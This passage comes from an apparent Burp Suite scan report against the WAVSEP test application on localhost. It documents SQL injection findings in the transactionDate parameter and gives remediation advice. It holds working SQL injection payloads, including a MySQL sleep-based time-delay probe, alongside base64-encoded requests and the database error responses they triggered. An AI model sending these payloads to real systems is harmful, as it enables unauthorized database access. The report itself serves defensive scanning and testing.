ZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE0NDcyMzM1NSUyMG9yJTIwNzc3MiUzZDA3NzcyIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NToyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTQ0NzIzMzU1IG9yIDc3NzI9MDc3NzImIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5394372108070964224</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>26500788 or 2088=02088</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NToyNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1OTQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxMjY1MDA3ODglMjBvciUyMDIwODglM2QwMjA4OCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDc5Nw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo0NyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICYjMzk7MjAxMC0wMS0wMTI2NTAwNzg4IG9yIDIwODg9MDIwODgmIzM5OzwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" 